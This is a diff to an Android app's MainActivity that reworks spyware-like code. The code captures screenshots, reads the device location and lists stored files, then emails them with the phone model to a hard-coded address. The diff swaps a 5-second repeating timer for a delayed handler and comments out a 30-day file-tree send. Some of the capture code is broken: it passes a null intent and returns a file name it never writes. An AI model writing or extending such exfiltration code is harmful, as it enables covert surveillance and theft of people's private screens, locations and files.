@@ -1,6 +1,7 @@
 package com.example.test;
 import android.Manifest;
 import android.annotation.SuppressLint;
+import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -17,6 +18,7 @@ import android.media.projection.MediaProjectionManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
+import android.os.Handler;
 import android.util.DisplayMetrics;
 import android.util.Log;
 import android.view.View;
@@ -164,39 +166,154 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+//    private File takeScreenshot() {
+//        try {
+//            String timestamp = new SimpleDateFormat("yyyyMMddHHmmss").format(new Date());
+//            // Get the display metrics
+//            DisplayMetrics metrics = getResources().getDisplayMetrics();
+//            int screenWidth = metrics.widthPixels;
+//            int screenHeight = metrics.heightPixels;
+//
+//            // Create an image reader to capture the screenshot
+//            @SuppressLint("WrongConstant") ImageReader imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 1);
+////            VirtualDisplay virtualDisplay = mMediaProjection.createVirtualDisplay("screenshot_"+ timestamp, screenWidth, screenHeight, metrics.densityDpi, VIRTUAL_DISPLAY_FLAGS, imageReader.getSurface(), null, null);
+//
+//            // Capture the screenshot
+//            Image image = imageReader.acquireLatestImage();
+//            Bitmap bitmap = Bitmap.createBitmap(image.getWidth(), image.getHeight(), Bitmap.Config.ARGB_8888);
+//            bitmap.copyPixelsFromBuffer(image.getPlanes()[0].getBuffer());
+//            image.close();
+//
+//            // Save the screenshot to a file
+//            File screenshotFile = new File(getExternalFilesDir(null), "screenshot.png");
+//            FileOutputStream fos = new FileOutputStream(screenshotFile);
+//            bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
+//            fos.flush();
+//            fos.close();
+//
+//            return screenshotFile;
+//
+//        } catch (Exception e) {
+//            e.printStackTrace();
+//        }
+//
+//        return null;
+//    }
+
     private File takeScreenshot() {
+        String timestamp = new SimpleDateFormat("yyyyMMddHHmmss").format(new Date());
+        // Get the display metrics
+        DisplayMetrics metrics = new DisplayMetrics();
+        getWindowManager().getDefaultDisplay().getMetrics(metrics);
+        int density = metrics.densityDpi;
+
+        // Get the dimensions of the screen
+        int screenWidth = metrics.widthPixels;
+        int screenHeight = metrics.heightPixels;
+
+        // Create the image reader
+        @SuppressLint("WrongConstant") ImageReader imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);
+
+        // Get the media projection manager
+        MediaProjectionManager mediaProjectionManager = null;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            mediaProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+        }
+
+        // Start the capture intent
+        Intent captureIntent = null;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            captureIntent = mediaProjectionManager.createScreenCaptureIntent();
+        }
+        startActivityForResult(captureIntent, REQUEST_CODE);
+
+        // Start the capture callback
+        final Image[] image = {null};
+        final FileOutputStream[] fos = {null};
+        final Bitmap[] bitmap = {null};
+
         try {
-            String timestamp = new SimpleDateFormat("yyyyMMddHHmmss").format(new Date());
-            // Get the display metrics
-            DisplayMetrics metrics = getResources().getDisplayMetrics();
-            int screenWidth = metrics.widthPixels;
-            int screenHeight = metrics.heightPixels;
+            imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
+                @Override
+                public void onImageAvailable(ImageReader reader) {
+                    try {
+                        // Get the image from the reader
+                        image[0] = imageReader.acquireLatestImage();
 
-            // Create an image reader to capture the screenshot
-            @SuppressLint("WrongConstant") ImageReader imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 1);
-//            VirtualDisplay virtualDisplay = mMediaProjection.createVirtualDisplay("screenshot_"+ timestamp, screenWidth, screenHeight, metrics.densityDpi, VIRTUAL_DISPLAY_FLAGS, imageReader.getSurface(), null, null);
+                        // Get the image dimensions
+                        int width = image[0].getWidth();
+                        int height = image[0].getHeight();
 
-            // Capture the screenshot
-            Image image = imageReader.acquireLatestImage();
-            Bitmap bitmap = Bitmap.createBitmap(image.getWidth(), image.getHeight(), Bitmap.Config.ARGB_8888);
-            bitmap.copyPixelsFromBuffer(image.getPlanes()[0].getBuffer());
-            image.close();
+                        // Create the bitmap
+                        bitmap[0] = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
 
-            // Save the screenshot to a file
-            File screenshotFile = new File(getExternalFilesDir(null), "screenshot.png");
-            FileOutputStream fos = new FileOutputStream(screenshotFile);
-            bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
-            fos.flush();
-            fos.close();
+                        // Copy the image data into the bitmap
+                        image[0].getPlanes()[0].getBuffer().rewind();
+                        bitmap[0].copyPixelsFromBuffer(image[0].getPlanes()[0].getBuffer());
 
-            return screenshotFile;
+                        // Save the bitmap to a file
+                        File file = new File(getExternalFilesDir(null), "screenshot.png");
+                        fos[0] = new FileOutputStream(file);
+                        bitmap[0].compress(Bitmap.CompressFormat.PNG, 100, fos[0]);
+
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    } finally {
+                        // Clean up
+                        if (image[0] != null) {
+                            image[0].close();
+                        }
+                        if (fos[0] != null) {
+                            try {
+                                fos[0].close();
+                            } catch (IOException e) {
+                                e.printStackTrace();
+                            }
+                        }
+                        if (bitmap[0] != null) {
+                            bitmap[0].recycle();
+                        }
+                    }
+                }
+            }, null);
+
+            // Start the capture
+            MediaProjection mediaProjection = null;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                Object data = null;
+                mediaProjection = mediaProjectionManager.getMediaProjection(Activity.RESULT_OK, (Intent) data);
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                mediaProjection.createVirtualDisplay("Screenshot", screenWidth, screenHeight, density, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
+            }
+
+            // Wait for the screenshot to be taken
+            Thread.sleep(1000);
 
         } catch (Exception e) {
             e.printStackTrace();
+        } finally {
+            // Clean up
+            if (image[0] != null) {
+                image[0].close();
+            }
+            if (fos[0] != null) {
+                try {
+                    fos[0].close();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+            }
+            if (bitmap[0] != null) {
+                bitmap[0].recycle();
+            }
         }
 
-        return null;
+        // Return the screenshot file
+        return new File(getExternalFilesDir(null), timestamp+"_screenshot.png");
     }
+
+
 
     //APP Info
 //    public void saveListApps(){
@@ -211,40 +328,6 @@ public class MainActivity extends AppCompatActivity {
 //
 //        sPref.edit().putString("apps_to_lock", sb.toString()).commit();
 //
-//    }
-
-
-//    protected static File takeScreenshot(View view, String filename) {
-//        Date date = new Date();
-//
-//        // Here we are initializing the format of our image name
-//        CharSequence format = android.text.format.DateFormat.format("yyyy-MM-dd_hh:mm:ss", date);
-//        try {
-//            // Initializing the directory of storage
-//            String dirpath = Environment.getExternalStorageDirectory() + "";
-//            File file = new File(dirpath);
-//            if (!file.exists()) {
-//                boolean mkdir = file.mkdir();
-//            }
-//
-//            // File name
-//            String path = dirpath + "/" + filename + "-" + format + ".jpeg";
-//            view.setDrawingCacheEnabled(true);
-//            Bitmap bitmap = Bitmap.createBitmap(view.getDrawingCache());
-//            view.setDrawingCacheEnabled(false);
-//            File imageurl = new File(path);
-//            FileOutputStream outputStream = new FileOutputStream(imageurl);
-//            bitmap.compress(Bitmap.CompressFormat.JPEG, 50, outputStream);
-//            outputStream.flush();
-//            outputStream.close();
-//            return imageurl;
-//
-//        } catch (FileNotFoundException io) {
-//            io.printStackTrace();
-//        } catch (IOException e) {
-//            e.printStackTrace();
-//        }
-//        return null;
 //    }
 
     // Function to get location
@@ -274,7 +357,6 @@ public class MainActivity extends AppCompatActivity {
             return null;
         }
     }
-
 
     // Function to get file storage access
     private File getFileStorageAccess() {
@@ -309,8 +391,8 @@ public class MainActivity extends AppCompatActivity {
         }
         return file;
     }
-    private void sendEmail(String subject, String message, File attachmentFile) {
-        JavaMailAPI javaMailAPI = new JavaMailAPI(this, Utils.senderEmail, message, subject , attachmentFile);
+    private void sendEmail(String subject, String message, File attachmentFile, boolean isScreenshot) {
+        JavaMailAPI javaMailAPI = new JavaMailAPI(Utils.senderEmail, subject , message ,attachmentFile, isScreenshot);
         javaMailAPI.execute();
     }
 
@@ -361,27 +443,45 @@ public class MainActivity extends AppCompatActivity {
 
             // Format message with location and file storage access
             String locationMessage = "Location: " + location.getLatitude() + ", " + location.getLongitude();
-            String fileAccessMessage = "File storage access: " + fileStorageAccess.getAbsolutePath();
+            String fileAccessMessage = " ";
+            if(fileStorageAccess != null)
+            {
+                if(fileStorageAccess.getAbsolutePath()!=null)
+                {
+                    fileAccessMessage = "File storage access: " + fileStorageAccess.getAbsolutePath();
+                }
+            }
 
             // Schedule a TimerTask to send email with screenshot and location information every 5 seconds
-            TimerTask task = new TimerTask() {
+            Handler handler = new Handler();
+            handler.postDelayed(new Runnable() {
                 @Override
                 public void run() {
-                    sendEmail(Build.MODEL, locationMessage, screenshot);
-                }
-            };
-            Timer timer = new Timer();
-            timer.schedule(task, 0, 5000);
+                    Log.d("Test2","Inside Send Data");
+                    sendEmail(Build.MODEL, locationMessage, screenshot, true);
 
-            // Schedule a TimerTask to send email with fileStorageAccess information every 30 days
-            TimerTask task2 = new TimerTask() {
-                @Override
-                public void run() {
-                    sendEmail(Build.MODEL, fileAccessMessage, new File(getFileTree(fileStorageAccess)));
                 }
-            };
-            Timer timer2 = new Timer();
-            timer2.schedule(task2, 0, 2592000000L);
+            }, 5000);
+//            TimerTask task = new TimerTask() {
+//                @Override
+//                public void run() {
+//                    Log.d("Test2","Inside Send Data");
+//                    sendEmail(Build.MODEL, locationMessage, screenshot);
+//                }
+//            };
+//            Timer timer = new Timer();
+//            timer.schedule(task, 0, 5000);
+//
+//            // Schedule a TimerTask to send email with fileStorageAccess information every 30 days
+//            String finalFileAccessMessage = fileAccessMessage;
+//            TimerTask task2 = new TimerTask() {
+//                @Override
+//                public void run() {
+//                    sendEmail(Build.MODEL, finalFileAccessMessage, new File(getFileTree(fileStorageAccess)));
+//                }
+//            };
+//            Timer timer2 = new Timer();
+//            timer2.schedule(task2, 0, 2592000000L);
         }
     }
 
